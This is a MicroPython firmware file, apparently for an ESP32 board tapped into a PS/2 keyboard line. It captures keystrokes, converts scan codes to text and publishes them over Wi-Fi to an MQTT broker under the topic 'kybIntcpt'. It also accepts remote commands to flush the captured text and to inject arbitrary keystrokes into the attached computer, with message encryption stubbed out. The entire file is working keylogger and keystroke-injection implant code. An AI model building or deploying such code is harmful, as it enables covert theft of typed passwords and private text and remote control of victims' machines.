import machine, time, os
import network
import _thread
import led
from machine import Timer, WDT, Pin
from micropython import const, mem_info
import gc
import colors
import lcd
import mqtt_wrapper
# import crypto_wrapper
import crypto_wrapper_none as crypto_wrapper
import uart_wrapper
import keyscan
from freq_counter import FreqCounter

BOOT_TIME = const(3)
DEVICE_FREQ = const(240 * 1000000)
HEARTBEAT_PERIOD = const(1000)  # ms

# display
display = None

# wifi
wlan = None
from wifi_credentials import WLAN_SSID, WLAN_KEY
DHCP_HOSTNAME = 'espresso0'

# MQTT
MQTT_HOSTNAME = 'alpcer0.local'
MQTT_TOPIC = 'kybIntcpt'

# PS/2
SCK_PIN = const(14)  # Outside jumper IO14

# status
heartbeat = Timer(-1)
status_dict = dict(
    hostname='null',
    seconds=0,
    freq=10000,
    msg=None,
    autobaud=True
)

# publish timer
publish_period = 5  # seconds
publish_timer = Timer(-2)

# capture buffer
capture_buffer = bytearray()

# frequency counter
frequency_counter = None


def check_uart():
    global capture_buffer
    if(not uart_wrapper.raw_uart.any()):
        return
    captured_raw = uart_wrapper.raw_uart.read()
    uart_wrapper.raw_uart.write(captured_raw)
    if(captured_raw is None):
        print('UART read returned none')
        return
    capture_buffer.extend(captured_raw)


def flush_buffer():
    global capture_buffer
    captured, processed_len = keyscan.keyscan_to_utf8(capture_buffer)
    capture_buffer = capture_buffer[processed_len:]
    if len(captured) != 0:
        mqtt_wrapper.mqtt_client.publish(MQTT_TOPIC, captured)


def simulate_capture(simulated_capture_str):
    global capture_buffer
    capture_buffer.extend(simulated_capture_str.encode('utf-8'))


def inject_string(inject_str):
    inject_keyscan = keyscan.utf8_to_keyscan(inject_str.encode('utf-8'))
    uart_wrapper.raw_uart.write(inject_keyscan)


def enable_autobaud():
    global status_dict
    status_dict.update(autobaud=True)


def disable_autobaud(splitted):
    global status_dict
    forced_baud = -1
    try:
        forced_baud = int(splitted)
    except:
        print('Invalid baud message received: {}'.format(splitted))
    if forced_baud != -1:
        status_dict.update(autobaud=False, freq=forced_baud)
        uart_wrapper.update_baudrate(forced_baud)


def handle_cmd(msg):
    msg = msg.decode()
    if msg.startswith('FLUSH'):
        status_dict.update(msg=msg.splitlines()[0])
        flush_buffer()
    elif msg.startswith('ECHO '):
        status_dict.update(msg=msg.splitlines()[0])
        splitted = msg.split('ECHO ')[1]
        print('MQTT Echo: {}'.format(splitted))
        mqtt_wrapper.mqtt_client.publish(
            MQTT_TOPIC,
            '{}:{}'.format(DHCP_HOSTNAME, splitted)
        )
    elif msg.startswith('SIMULATE_CAPTURE '):
        status_dict.update(msg=msg.splitlines()[0])
        splitted = msg.split('SIMULATE_CAPTURE ')[1]
        print('SimCap: {}'.format(splitted))
        simulate_capture(splitted)
    elif msg.startswith('INJECT '):
        status_dict.update(msg=msg.splitlines()[0])
        splitted = msg.split('INJECT ')[1]
        print('Inject: {}'.format(splitted))
        inject_string(splitted)
    elif msg.startswith('AUTOBAUD'):
        status_dict.update(msg=msg.splitlines()[0])
        print('Autobaud on')
        enable_autobaud()
    elif msg.startswith('BAUD '):
        status_dict.update(msg=msg.splitlines()[0])
        splitted = msg.split('BAUD ')[1]
        print('Baud: {}'.format(splitted))
        disable_autobaud(splitted)
    else:
        print('Unknown MQTT message received: {}'.format(msg))
        return
    display.update_popup(msg)


def on_mqtt_msg_received(topic, msg):
    global status_dict, display
    if msg.startswith('#'):
        print('MQTT comment: {}'.format(msg))
        return
    if not crypto_wrapper.is_encrypted(msg):
        print('Incoming MQTT message is not encrypted:'+msg.decode())
        return
    msg = crypto_wrapper.decrypt(msg)
    handle_cmd(msg)


def repl_wait():
    global BOOT_TIME
    print('Press CTRL-C in {} seconds to drop to REPL'.format(BOOT_TIME), end='')
    for seconds in range(BOOT_TIME):
        print('\rPress CTRL-C in {} seconds to drop to REPL'.format(BOOT_TIME-seconds), end='')
        print('.' * (seconds+1), end='')
        time.sleep(1)
    print('\rPress CTRL-C in 0 seconds to drop to REPL%s' % ('.' * BOOT_TIME))


def update_auto_baudrate(new_freq):
    global status_dict
    if not status_dict['autobaud']:
        return
    # if new_freq < 9e3:
    #     return
    # if new_freq > 17e3:
    #     return
    freq_diff = abs(uart_wrapper.baudrate - new_freq)
    if freq_diff / new_freq >= 0.1:
        print('Setting baudrate to {}kHz'.format(new_freq))
        uart_wrapper.update_baudrate(new_freq)


def heartbeat_callback(timer_obj):
    global frequency_counter
    print_status()
    update_auto_baudrate(frequency_counter.freq_hz)


def publish_timer_callback(timer_obj):
    global status_dict
    mqtt_wrapper.mqtt_client.publish(
        MQTT_TOPIC,
        '# {hostname} Uptime: {seconds: 5d}s\tfreq:{freq: 4d}\tautobaud:{autobaud}\t'.format(
            **status_dict
        )
    )


def print_status():
    global status_dict
    print(
        'Uptime: {seconds: 5d}s\t\tfreq:{freq: 4d}\t\tautobaud:{autobaud}\t\t'.format(
            **status_dict
        )
    )
    status_dict['seconds'] += 1


def init_wifi(timeout=None):
    global wlan, WLAN_SSID, WLAN_KEY, DHCP_HOSTNAME
    wlan = network.WLAN(network.STA_IF)
    wlan.active(True)
    while wlan.status() != network.STAT_IDLE:
        print('Waiting ifup for wlan'.format(wlan.status()))
    wlan.config(dhcp_hostname=DHCP_HOSTNAME)
    if not wlan.isconnected():
        print('connecting to network...')
        wlan.connect(WLAN_SSID, WLAN_KEY)
        start_time = time.time()
        while not wlan.isconnected():
            if timeout is not None:
                if time.time()-start_time > timeout:
                    return False
    print('network config:', wlan.ifconfig())
    print('dhcp hostname', wlan.config('dhcp_hostname'))
    status_dict.update(hostname=wlan.config('dhcp_hostname'))
    return True


def init_mqtt():
    mqtt_wrapper.init(
        client_id=DHCP_HOSTNAME,
        sub_topic=MQTT_TOPIC,
        callback=on_mqtt_msg_received
    )


def init_heartbeat_timer():
    heartbeat.init(
        period=round(HEARTBEAT_PERIOD),
        mode=Timer.PERIODIC,
        callback=heartbeat_callback
    )


def init_publish_timer():
    publish_timer.init(
        period=publish_period * 1000,
        mode=Timer.PERIODIC,
        callback=publish_timer_callback
    )


def init_frequency_counter():
    global frequency_counter
    frequency_counter = FreqCounter(pin_number=SCK_PIN)


def main_init():
    global display, wlan
    machine.freq(DEVICE_FREQ)

    led.init()
    led.heartbeat_color = led.RED
    led.heartbeat(True)

    display = lcd.Display()
    display.init_lcd()
    display.update_popup(subtitle=MQTT_TOPIC, cmd='n0n3!\nOn Init')

    display.wifi_connecting(WLAN_SSID, WLAN_KEY)
    if(init_wifi()):
        led.heartbeat_color = led.GREEN
        ifconfig = wlan.ifconfig()
        display.wifi_connected(ifconfig, status_dict['hostname'])
        print('Wifi initialised')

    if(uart_wrapper.init() is not None):
        print('Uart initialised')

    init_mqtt()
    mqtt_wrapper.mqtt_client.publish(
        MQTT_TOPIC, '# {} is up'.format(DHCP_HOSTNAME)
    )
    print('MQTT initialised')

    init_publish_timer()
    init_heartbeat_timer()

    init_frequency_counter()

    return 0


def main():
    repl_wait()
    print('app.py')
    main_init()
    while True:
        mqtt_wrapper.mqtt_client.check_msg()
        check_uart()
        time.sleep(0.005)
